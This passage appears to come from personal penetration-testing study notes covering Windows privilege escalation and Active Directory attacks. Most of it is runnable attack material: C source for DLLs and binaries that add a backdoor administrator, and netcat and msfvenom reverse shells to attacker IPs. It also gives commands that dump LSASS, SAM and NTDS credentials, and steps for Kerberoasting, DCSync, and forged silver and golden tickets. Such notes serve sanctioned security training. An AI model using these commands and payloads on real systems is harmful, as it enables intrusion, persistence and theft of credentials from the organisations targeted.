>>DWORD ul_reason_for_call,// Reason for calling function
>>LPVOID lpReserved ) // Reserved  
>>{
>>	switch ( ul_reason_for_call )
>>	{  
>>	case DLL_PROCESS_ATTACH: // A process is loading the DLL.  
>>		int i;  
>>		i = system ("net user dave2 password123! /add");  
>>		i = system ("net localgroup administrators dave2 /add");
>>		break;  
>>		case DLL_THREAD_ATTACH: // A process is creating a new thread.
>>		break;  
>>		case DLL_THREAD_DETACH: // A thread exits normally.  
>>		break;  
>>		case DLL_PROCESS_DETACH: // A process unloads the DLL.  
>>		break;
>>	}
>>	return TRUE;
>>}
>>```
>
>Compile it:
>```bash
>kali@kali:~$ x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
>```

>[!code]- Transfer the malicious DLL to the target machine
>[](Transfer%20Files.md#Transfer%20to%20Windows|Options%20here).

>[!code]- Restart the service
>```powershell
>PS C:\Users\steve\Documents> Restart-Service BetaService
>```
#### Unquoted Service Paths

>[!exploit]- Exploit - The service binary path contains a space
>If the file path to a service binary contains a space, the file path will be interpreted in various ways. For example, for the service binary path of **C:\Program Files\My Program\My Service\service.exe**, Windows uses the following order to try start the executable file:
>```powershell
>C:\Program.exe
>C:\Program Files\My.exe  
>C:\Program Files\My Program\My.exe  
>C:\Program Files\My Program\My service\service.exe
>```
>We can create a malicious executable and place it in a directory that corresponds with one of the possible file paths whilst matching its file name to the corresponding interpreted file name. For example: name our executable **Program.exe** and place it in **C:/**.

>[!code]- Find a suitable unquoted service path
>Enumerate running and stopped services:
>(Via Get-CimInstance or wmic)
>```powershell
>PS C:\Users\steve> Get-CimInstance -ClassName win32_service | Select Name,State,PathName
>
>C:\Users\steve> wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
>```
>___
>
>Ensure that we can stop/start the service:
>```powershell
>PS C:\Users\steve> Start-Service GammaService
>PS C:\Users\steve> Stop-Service GammaService
>```
>___
>
>Check we have write access for at least one of the possible paths:
>For:
>```powershell
>C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
>```
>We'd check:
>```powershell
>C:\Program.exe
>PS C:\Users\steve> icacls "C:\"
>
>C:\Program Files\Enterprise.exe
>PS C:\Users\steve> icacls "C:\Program Files"
>
>C:\Program Files\Enterprise Apps\Current.exe
>PS C:\Users\steve> icacls "C:\Program Files\Enterprise Apps"
># We have write access to the Enterprise Apps folder
>```

>[!code]- Create a malicious binary and move it to the chosen folder
>Create a binary.
>It creates a user and adds them to the admin group.
>>[!code]- adduser.c
>>```c
>>#include <stdlib.h>
>>
>>int main ()
>>{  
>>	int i;
>>	i = system ("net user dave2 password123! /add");  
>>	i = system ("net localgroup administrators dave2 /add");
>>	return 0;
>>}
>>```
>___
>Compile it.
>
>The target machine is 64-bit so we'll cross-compile the C code to a 64-bit application with **x86_64-w64-mingw32-gcc**.
>- **-o** to specify the name of the compiled executable
>```bash
kali@kali:~$ x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
>```
>___
>Transfer the binary to the victim machine. See options [](Transfer%20Files.md#Transfer%20to%20Windows|here).
>___
>Copy the binary to the chosen folder:
>```powershell
>PS C:\Users\steve> copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
>```

>[!code]- Restart the service
>Restart:
>```powershell
>PS C:\Users\steve> Start-Service GammaService
>```
>___
>The service should restart and execute the malicious binary, because it will look for it in the folder we placed it before it looks for the original authenticate binary.

>[!code]- Automate the exploit with PowerUp
>If successful, PowerUp will create a new local user called john with the password **Password123!**. The user is then added to the local Admin group.
>```powershell
>PS C:\Users\dave> Get-UnquotedService
>PS C:\Users\steve> Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
>```
#### Scheduled Tasks

>[!info]- Info - What are scheduled tasks?
>Scheduled Tasks are used to execute various automated tasks, like clean-up activities and update management. These tasks have one or more triggers, which when met cause an action.

>[!exploit]- Exploit - a scheduled task could allow code execution as a privileged user

>[!code]- Find a vulnerable scheduled task
>We are looking for the following three things:
>1. The task is executed as a higher privileged user
>2. The task will be triggered soon
>3. When triggered the task will execute something we can take advantage of.
>___
>View the scheduled tasks:
>```powershell
>Get-ScheduledTask  # PowerView
>PS C:\Users\steve> schtasks /query /fo LIST /v
>```
>We find a task that will execute the following binary `C:\Users\steve\Pictures\BackendCacheCleanup.exe`.

>[!code]- Exploit the found scheduled task
>Check if we have write access to the **Picture** folder: 
>```powershell
>PS C:\Users\steve> icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
>C:\Users\steve\Pictures\BackendCacheCleanup.exe
>	NT AUTHORITY\SYSTEM:(I)(F)
>	BUILTIN\Administrators:(I)(F)
>	CLIENTWK220\steve:(I)(F)
>	CLIENTWK220\offsec:(I)(F)
>```
>___
>Create a malicious binary:
>It creates a user and adds them to the admins group.
>>[!code]- adduser.c
>>```c
>>#include <stdlib.h>
>>
>>int main ()
>>{  
>>	int i;
>>	i = system ("net user dave2 password123! /add");  
>>	i = system ("net localgroup administrators dave2 /add");
>>	return 0;
>>}
>>```
>
>___
>Compile it (ensure 64-bit compiler is correct):
>```bash
>kali@kali:~$ x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
>```
>___
>Transfer it to the victim machine. See options [](Transfer%20Files.md#Transfer%20to%20Windows|here).
>___
>Replace it with the original binary and wait for the scheduled tasks to execute it:
>```powershell
>PS C:\Users\steve> move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
>PS C:\Users\steve> move .\BackendCacheCleanup.exe .\Pictures\
>```
#### Privileges (Se...)
###### SeImpersonatePrivilege

>[!code]- PrintSpoofer (Windows 10 & Server 2019 where JuicyPotato doesn't work)
>###### Run it on the victim:
>- **-c** to specify the command we want to execute (powershell)
>- **-i** to interact with the process in the current command prompt
>```powershell
>PrintSpoofer64.exe -i -c powershell.exe
>PrintSpoofer64.exe -c "cmd /c powershell -c C:/Windows/Tasks/rev.ps1"
>```
>![Pasted image 20240509045405](Pasted%20image%2020240509045405.png)

>[!code]- JuicyPotato (requires < Windows Server 2019 or Windows 10 build 1809)
>- (Having setup a listener on port 8443)
>- **-l** is the COM server listening port
>- **-p** is the program to launch (cmd.exe)
>- **-a** is the argument passed to cmd.exe
>- **-t** is the **createprocess** call (try both _CreateProcessWithTokenW_ and _CreateProcessAsUser_)
>- **-c** CLSID
>```powershell
>c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
>```
>
>```powershell
>./JuicyPotato.exe -t * -p c:\windows\system32\cmd.exe -a "/c c:\users\sophie\documents\nc.exe -e cmd.exe 10.10.X.Y 1234" -l 63636 -c "{8BC3F05E-D86B-11D0-A075-00C04FB68820}"
>```
>
>[Possible CLSIDs](https://ohpe.it/juicy-potato/CLSID/)

>[!code]- GodPotato
>###### Command
>```powershell
>GodPotato -cmd "cmd /c whoami"
>```
>###### Reverse shell
>```powershell
>GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
>```
>###### Create Admin user
>```powershell
>GodPotato -cmd "net user /add backdoor Password123"
>GodPotato -cmd "net localgroup administrators /add backdoor"
>RunasCs.exe backdoor Password123 "C:/Users/Public/reverse.exe" --force-profile --logon-type 8
>```
>###### One liner add Admin user and enable RDP
>```powershell
>net user /add bubbleman Password123! && net localgroup administrators bubbleman /add & net localgroup "Remote Desktop Users" bubbleman /add & netsh advfirewall firewall set rule group="remote desktop" new enable=Yes & reg add HKEY_LOCAL_MACHINE\Software\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList /v bubbleman /t REG_DWORD /d 0 & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v TSEnabled /t REG_DWORD /d 1 /f & sc config TermService start= auto
>```
###### SeBackupPrivilege

>[!code]- Extract local hashes from the SAM and SYSTEM hives
>###### Create a copy of the hives
>```powershell
>reg save hklm\system C:\Users\molly.smith\temp\system  # writeable folder
>reg save hklm\sam C:\Users\molly.smith\temp\sam   # writeable folder
>```
>###### Transfer those copies to Kali
>###### Extract hashes for local accounts from the hives
>```powershell
>impacket-secretsdump -sam ./sam -system ./system local
>```
###### SeManageVolumePrivilege

>[!code]- tzres.dll
>###### Run [this exploit](https://github.com/CsEnox/SeManageVolumeExploit)
>![Pasted image 20241104145417](Images/Pasted%20image%2020241104145417.png)
>###### As per [this guide](https://medium.com/@raphaeltzy13/exploiting-semanagevolumeprivilege-with-dll-hijacking-windows-privilege-escalation-1a4f28372d37) - create a malicious tzres.dll and copy to C:\Windows\System32\wbem\tzres.dll
>![Pasted image 20241104145507](Images/Pasted%20image%2020241104145507.png)
>![Pasted image 20241104145534](Images/Pasted%20image%2020241104145534.png)
>###### Run systeminfo to execute tzres.dll and obtain a shell

>[!code]- WerTrigger
>###### Run this [WerTrigger exploit](https://github.com/sailay1996/WerTrigger)
###### SeRestorePrivilege

>[!code]- Use [an exploit](https://github.com/dxnboy/redteam/tree/master) to elevate privileges using the SeRestorePrivilege
>###### Create a reverse shell
>![Pasted image 20241129043155](Images/Pasted%20image%2020241129043155.png)
>###### Use the exploit to execute that reverse shell as Admin
>![Pasted image 20241129043231](Images/Pasted%20image%2020241129043231.png)
>###### Catch the reverse shell
>![Pasted image 20241129043307](Images/Pasted%20image%2020241129043307.png)
###### Local Service (upgrade to full privileges)

>[!code]- Via a scheduled Task
>###### As per Offsec guide for Squid
>```powershell
>$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `"C:\wamp\www\nc.exe 192.168.45.211 4444 -e cmd.exe`""
>
>Register-ScheduledTask -Action $TaskAction -TaskName "GrantPerm"
>
>Start-ScheduledTask -TaskName "GrantPerm"
>```
#### Autologon

>[!code]- Check for autologon credentials
>```powershell
>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 
>```
#### Logon Sessions (PuTTY etc.)

>[!code]- PuTTY
>###### SessionGopher (can do more than PuTTY, see [Hacktricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation) for source)
>```powershell
>Import-Module path\to\SessionGopher.ps1;
>Invoke-SessionGopher -Thorough
>Invoke-SessionGopher -AllDomain -o
>Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
>```
>###### Manually
>```powershell
>reg query "HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions"
>```

>[!code]- Password spraying
>###### Linux host
>```powershell
># Bash one liner 
>for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
>
># Kerbrute
>kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
>
># CME
>crackmapexec smb 172.16.5.5 -u valid_users.txt -p 'Password123' --continue-on-success | grep +
>crackmapexec smb 10.10.10.169 -u users.txt -p passwords.txt
>crackmapexec smb 172.16.5.5 -u avazquez -p Password123 # validate
>```
>
>###### Windows host
>```powershell
># Kerbrute
>PS C:\Tools> .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
>
># LDAP
># https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/Spray-Passwords.ps1
>.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
>
># DomainPasswordSpray.ps1
>Import-Module .\DomainPasswordSpray.ps1
>Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
>```

>[!code]- Hash spraying
>###### From a Linux host
>```powershell
>crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
>```

>[!code]- Credential harvesting on the network
>###### Responder (Linux)
>```powershell
>responder -I ens224
>
># logs stored at /usr/share/responder/logs
>```
>###### Inveigh (Windows)
>```powershell
>PS C:\htb> Import-Module .\Inveigh.ps1
>
># LLMNR and NBNS spoofing
># Output to console
># Write to file
>PS C:\htb> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
>
># C# version (no longer updated)
># Hit ESC to enter/exit interactive console
>PS C:\htb> .\Inveigh.exe
>
># \<interactive console>
>HELP
>GET NTLMV2UNIQUE
>GET NTLMV2USERNAMES
>```
#### Dump cached logon hashes

>[!warning] Requires
>- Login credentials
>- SYSTEM or local admin permissions
>- SeDebugPrivilege (might come with the admin privileges)

>[!code]- Using Mimikatz
>Start PowerShell as admin and load Mimikatz:
>```powershell
>PS C:\Tools\> .\mimikatz.exe
>```
>Engage SeDebugPrivilege:
>```
>mimikatz # privilege::debug
>```
>Dump hashes:
>```
>mimikatz # sekurlsa::logonpasswords
>```

>[!code]- Using SysInternals (bypass AV)
>###### 1. Dump the LSASS
>Locally:
>```powershell
>C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
>```
>Remotely:
>```powershell
>net use Z: https://live.sysinternals.com
>Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
>```
>###### 2. Parse the dump on attacking machine
>Load the dump:
>```powershell
>mimikatz # sekurlsa::minidump lsass.dmp
>```
>Extract credentials:
>```powershell
>mimikatz # sekurlsa::logonPasswords
>```
#### Dump cached Kerberos tickets

>[!warning] Requires
>- Login credentials
>- SYSTEM or local admin permissions

>[!code]- Using Mimikatz
>Start PowerShell as admin and load Mimikatz:
>```powershell
>PS C:\Tools\> .\mimikatz.exe
>```
>Engage SeDebugPrivilege:
>```
>mimikatz # privilege::debug
>```
>Dump tickets:
>```
>mimikatz # sekurlsa::tickets
>```
#### AS-REP Roasting

>[!exploit]- Exploit - If an account has Kerberos pre-authentication disabled, we could force it to send us a message encrypted with its password, then attempt to decrypt that password 
>However, if preauthentication is disabled, an attacker could request authentication data for any user and the DC would return an AS-REP message. Since part of that message is encrypted using the user’s password, the attacker can then attempt to brute-force the user’s password offline.

>[!code]- Find vulnerable accounts
>###### PowerView
>```powershell
>PS C:\htb> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
>```
>###### Impacket
>```powershell
># Null
>GetNPUsers.py inlanefreight.local/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users
>
># Credentialed
>impacket-GetNPUsers -request -dc-ip 172.16.133.200 oscp.exam/c.rogers:SqueakyRedDesk111
>```

>[!code]- Obtain AS-REP hash
>###### Rubeus
>```powershell
># Any
>PS C:\Tools> .\Rubeus.exe asreproast /nowrap [/format:hashcat] [/outfile:C:\Temp\hashes.txt]
># Single
>PS C:\htb> .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
>```
>###### Impacket
>```powershell
># Single
>impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
># List
>impacket-GetNPUsers -dc-ip 10.10.10.161 -usersfile ./users.txt htb.local/
># No password
>impacket-GetNPUsers -dc-ip 10.10.10.161 -usersfile ./users.txt htb.local/ -no-pass
>```
>###### Kerbrute (brute force)
>```powershell
>kerbrute userenum -d EGOTISTICAL-BANK.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.175
>```

>[!code]- Cracking the obtained hashes
>###### Hashcat
>```powershell
># Find hash type
>kali@kali:~$ hashcat --help | grep -i "Kerberos"
># Crack
>kali@kali:~$ hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
>```
#### Kerberoasting

>[!exploit]- Exploit - obtain a TGS that is encrypted with an SPN account's password hash then attempt to decrypt that password

>[!code]- Obtain an SPN account hash
>###### Windows - rubeus
>```powershell
># The identified SPNs will relate to the domain user that the command is run in the context of
>
>PS C:\Tools> .\Rubeus.exe kerberoast /tgtdeleg /outfile:hashes.kerberoast
>PS C:\htb> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap  # admin accounts, no column wrap
>```
>###### Windows - manually
>```powershell
># Obtain with NET classes
>PS C:\> Add-Type -AssemblyName System.IdentityModel
>PS C:\> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "\<SPN>"
>
># Obtain with setspn.exe
>PS C:\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
>
># Extract with Mimikatz
>mimikatz # kerberos::list /export
>```
>###### Windows - PowerView
>```powershell
>PS C:\htb> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
>```
>###### Linux:
>- **-request** to obtain the TGS and output them in a Hashcat compatible format
>- **-dc-ip** to specify the IP address of the domain controller
>- **domain/user**  to specify which user to connect to the AD environment as
>```powershell
># Obtain all possible hashes
>kali@kali:~$ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete:Password123!
>
># Obtain hash for particular user
>bubbleman@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
>```

>[!code]- Crack the obtained SPN account hash
>###### TGS hash types
>```powershell
>$krb5tgs$23$*  # RC4 (weak)
>$krb5tgs$18$*  # AES-256 (strong)
>```
>###### tgsrepcrack.py
>```powershell
>./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
>```
>
>###### Hashcat:
>```powershell
>kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
>```

>[!code]- Test credentials against a DC
>###### CME
>```powershell
>bubbleman@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
>```
#### Targeted Kerberoasting

>[!info]- Sees which users the current user has GenericWrite permissions, then for those users sets a temporary SPN to obtain hash for. Then deletes the SPN upon completion.

>[!code]- Obtain SPN hash (setting a SPN if possible)
>###### targetedKerberoast.py
>```powershell
># Any user
>python targetedKerberoast.py -v -d 'hokkaido-aerospace.com' -u 'hrapp-service' -p 'Untimed$Runny' --dc-ip 192.168.209.40
>
># Particular user
>python targetedKerberoast.py -v -d 'hokkaido-aerospace.com' -u 'hrapp-service' -p 'Untimed$Runny' --dc-ip 192.168.209.40 --request-user hazel.green
>```
#### Silver Tickets

>[!exploit]- Exploit - With a service's hash we can forge a TGS which has any permissions on that service that we desire

>[!warning] Requires - hash of a SPN, domain SID, and SPN

>[!warning]- Limitation - can no longer get silver tickets for non-existent accounts 
>Since silver and golden tickets represent powerful attack techniques, Microsoft created a security patch to update the PAC structure.[5](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/attacking-active-directory-authentication/performing-attacks-on-active-directory-authentication/silver-tickets#fn5) With this patch in place, the extended PAC structure field _PAC_REQUESTOR_ needs to be validated by a domain controller. This mitigates the capability to forge tickets for non-existent domain users if the client and the KDC are in the same domain. Without this patch, we could create silver tickets for domain users that do not exist. The updates from this patch are enforced from October 11, 2022.

>[!info]- Info - What is a silver ticket?
>Remembering the inner workings of the Kerberos authentication, the application on the server executing in the context of the service account checks the user's permissions from the group memberships included in the service ticket. However, the user and group permissions in the service ticket are not verified by the application in a majority of environments. In this case, the application blindly trusts the integrity of the service ticket since it is encrypted with a password hash that is, in theory, only known to the service account and the domain controller.
>
>With the service account password or its associated NTLM hash at hand, we can forge our own service ticket to access the target resource (in our example, the IIS application) with any permissions we desire. This custom-created ticket is known as a _silver ticket_ and if the service principal name is used on multiple servers, the silver ticket can be leveraged against them all.
>
>In general, we need to collect the following three pieces of information to create a silver ticket:
>- SPN password hash
>- Domain SID
>- Target SPN

>[!code]- Obtain the information required to forge a TGS
>Obtain a SPN password hash
>- If with admin privileges:
>	1. dump cached logon passwords
>	2. dump cached Kerberos tickets
>- Else:
>	1. AS-REP roasting
>	2. Kerberoasting
>
>Obtain the domain SID:
>```powershell
>PS C:\Users\jeff> whoami /user
>```
>![Pasted image 20241115064802](Images/Pasted%20image%2020241115064802.png)
>
>Obtain a target SPN by listing all SPNs (see Enumeration Active Directory section).

>[!code]- Create a forged TGS with the obtained information
>###### Mimikatz
>- **/sid** specifies the domain SID
>- **/domain** specifies the domain name
>- **/target** specifies where the SPN runs
>- **/service** specifies the SPN protocol
>- **/rc4** specifies the SPN's NTLM hash
>- **/ptt** allows us to inject the forged ticket into the memory of the machine we execute the command on
>- **/user** specifies an existing domain user
>```
>mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
>```
>Confirm the TGS is in memory:
>```powershell
>PS C:\Tools> klist
>```
>###### Linux
>```powershell
>impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com -user-id 500 Administrator
>```
>###### See [Nagoya](Boxes/PG-Nagoya.md) box for an example of a silver ticket attack being used
#### DCSync Attack

>[!warning]- Requires domain login credentials with _Replicating Directory Changes_, _Replicating Directory Changes All_, and _Replicating Directory Changes in Filtered Set_ permissions. By default these groups have that...
>Administrators
>Domains Admins
>Enterprise Admins

>[!exploit]- Exploit - Obtain a copy of the domain database which contains all user hashes
>Luckily for us, the domain controller receiving a request for an update does not check whether the request came from a known domain controller. Instead, it only verifies that the associated SID has appropriate privileges. If we attempt to issue a rogue update request to a domain controller from a user with certain rights it will succeed.

>[!code]- Using Mimikatz
>Load Mimikatz:
>```powershell
>PS C:\Tools\> .\mimikatz.exe
>```
>Perform the DCSync attack:
>```
>mimikatz # lsadump::dcsync /user:corp\dave
>mimikatz # lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:administrator
>```

>[!code]- Using impacket-secretsdump
>- **-just-dc-user** to specify the user to obtain hash for
>- **domain/user:password@ip** to specify the credentials of the domain user with the necessary permissions as well as the IP address of the DC
>```bash
>kali@kali:~$ impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
>```

>[!code]- Crack obtained NTLM hash
>With Hashcat:
>```bash
>kali@kali:~$ hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
>```
#### Golden Ticket

>[!warning] Requires - the krbtgt hash

>[!exploit]- Exploit - With the krbtgt hash we can forge TGTs, allowing us to forge any TGSs

>[!code]- Purge any existing kerberos tickets
>With Mimikatz:
>```powershell
>mimikatz # kerberos::purge
>```
>___
>With cmd:
>```powershell
>klist purge
>```

>[!code]- Launch a new cmd process with an injected golden TGT with Mimikatz
>Get the domain SID for the Mimikatz command:
>```powershell
>C:\Users\pete> whoami /user
>```
>___
>Create the golden ticket with Mimikatz:
>- **/krbtgt** (instead of **/rc4**) to specify that we are supplying the password hash of the _krbtgt_ user account
>- We specify an existing domain user, **jen** (before Microsoft patched Windows in July 2022, we didn't have to)
>```powershell
>mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
>```
>___
>Launch a new cmd process with the injected golden ticket:
>```powershell
>mimikatz # misc::cmd
>```

>[!code]- On the new cmd process use PsExec to start a remote session
>- Specify the remote machine with the dns name rather than IP address, otherwise NTLM authentication would be used and not the golden Kerberos ticket and would fail
>```powershell
>C:\Tools\SysinternalsSuite>PsExec.exe \\dc1 cmd.exe
>```
#### Shadow Copies

>[!warning]- Requires - Member of the Domain Admins group

>[!exploit]- Abuse the vshadow utility to create a copy of the AD database and extract every user credential

>[!code]- Create a shadow copy of the NTDS.dit
>Launch an elevated command prompt.
>___
>Create a shadow copy with vshadow.exe
>- **-nw** to [disable writers](https://learn.microsoft.com/en-us/windows/win32/vss/shadow-copy-creation-details), which speeds up backup creation
>- **-p** option to store the copy on disk
>```powershell
>C:\Tools>vshadow.exe -nw -p  C:
>```
>___
>
>Note the device name.

>[!code]- Backup the current NTDS.dit and system registry hive
>NTDS.dit:
>```powershell
>C:\Tools>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
>```
>___
>
>System registry hive:
>```powershell
>C:\>reg.exe save hklm\system c:\system.bak
>```

>[!code]- Extract credentials from the NTDS.dit using the system registry hive
>- **-ntds** to provide the ntds.dit backup file we created
>- **-system** to provide the backup system registry file
>- **LOCAL** to parse the files locally
>```bash
>kali@kali:~$ impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
>```
#### Group Membership

>[!code]- DnsAdmins
>We have the ability to cause the DNS service to load a DLL of our choosing upon starting up.
>###### Create the DLL
>```powershell
>msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.13 LPORT=9001 -f dll > rev.dll
>```
>![Pasted image 20240901070858](Images/Pasted%20image%2020240901070858.png)
>
>###### Link the DLL to the DNS service
>```powershell
>dnscmd.exe /config /serverlevelplugindll \\10.10.14.13\share\rev.dll
>```
>![Pasted image 20240902081424](Images/Pasted%20image%2020240902081424.png)
>###### Make the DLL reachable
>```powershell
># On Kali (in folder containing rev.dll)
>impacket-smbserver share .
>
># Create a listener
>rlwrap nc -lvnp 9001
>```
>![Pasted image 20240902081452](Images/Pasted%20image%2020240902081452.png)
>###### Stop and start and DNS service
>```powershell
>sc.exe stop dns
>sc.exe start dns
>```
>![Pasted image 20240902081524](Images/Pasted%20image%2020240902081524.png)
#### Permissions
###### GenericAll

>[!code]- On a computer object (Kerberos Resource-based Constrained Delegation)
>###### First check that the requirements are all OK as per [this guide](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)
>- RESOURCEDC = victim with GenericAll permissions over
>- FAKE01 = created computer object
>- FAKE01$ = created computer account for the computer object
>###### Add a computer account
>```powershell
># impacket
>impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.167.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'FAKE01$' -computer-pass '123456'
>
># addcomputer.py
>addcomputer.py -method LDAPS -computer-name 'FAKE01$' -computer-pass '123456' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'
>
># powermad
>import-module powermad
>New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
>```
>###### Check that the computer was created
>```powershell
>Get-DomainComputer fake01
>get-adcomputer fake01
>```
>###### Set the delegation attribute for the created machine account
>```powershell
># AD PS module
>Set-ADComputer resourcedc -PrincipalsAllowedToDelegateToAccount FAKE01$
>
># PowerView
>$ComputerSid = Get-DomainComputer FAKE01 -Properties objectsid | Select -Expand objectsid
>$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
>$SDBytes = New-Object byte[] ($SD.BinaryLength)
>$SD.GetBinaryForm($SDBytes, 0)
>Get-DomainComputer resourcedc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
>
># PowerView
>Get-DomainComputer resourcedc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
>
># rbcd.py
># -t target machine (victim with GenericAll permissions over)
>sudo python3 /opt/rbcd-attack/rbcd.py -dc-ip 192.168.167.175 -t RESOURCEDC -f 'FAKE01' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone
>```
>###### Check that delegation was successful
>```powershell
># AD PS module
>Get-ADComputer -Identity "resourcedc" -Properties msds-AllowedToActOnBehalfOfOtherIdentity | Select-Object -ExpandProperty msds-AllowedToActOnBehalfOfOtherIdentity
>
># PowerView
>Get-DomainComputer resourcedc -Properties 'msds-allowedtoactonbehalfofotheridentity'
>```
>###### Perform a S4U attack (see linked guide above or HackTricks)
>###### ...Or get the Administrator service ticket (as per [this guide](https://medium.com/@ardian.danny/oscp-practice-series-65-proving-grounds-resourced-05eb9a129e28))
>```powershell
># 1 Get ticket
>impacket-getST -spn cifs/resourcedc.resourced.local resourced/attack\$:'FAKE01' -impersonate Administrator -dc-ip 192.168.167.175
>
># 2 Set environment variable
>export KRB5CCNAME=./Administrator.ccache
>
># 3 Add victim IP to hosts file
>sudo sh -c 'echo "192.168.167.175 resourcedc.resourced.local" >> /etc/hosts'
>
># 4 Psexec as Administrator using the cached Administrator kerberos ticket
>sudo impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.167.175
>```
## Lateral Movement
#### WMI (wmic.exe / PS WMI)

>[!warning]- Requires - credentials for user with Administrators membership on remote machine

>[!warning]- Limitation - The wmic utility is now deprecated
>**[Update - January 2024]**: Currently, WMIC is a Feature on Demand (FoD) that's [preinstalled by default](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/features-on-demand-non-language-fod#wmic) in Windows 11, versions 23H2 and 22H2. In the next release of Windows, the WMIC FoD will be disabled by default.
>
>[Read more.](https://learn.microsoft.com/en-us/windows/whats-new/deprecated-features)The WMIC utility is deprecated in Windows 10, version 21H1 and the 21H1 General Availability Channel release of Windows Server. This utility is superseded by [Windows PowerShell for WMI](https://learn.microsoft.com/en-us/powershell/scripting/learn/ps101/07-working-with-wmi). Note: This deprecation applies to only the [command-line management utility](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmic). WMI itself isn't affected.

>[!code]- Spawn a remote process (eg. calculator) with wmic.exe
>- Launch the calculator app as jen on machine 192.168.50.73
>```powershell
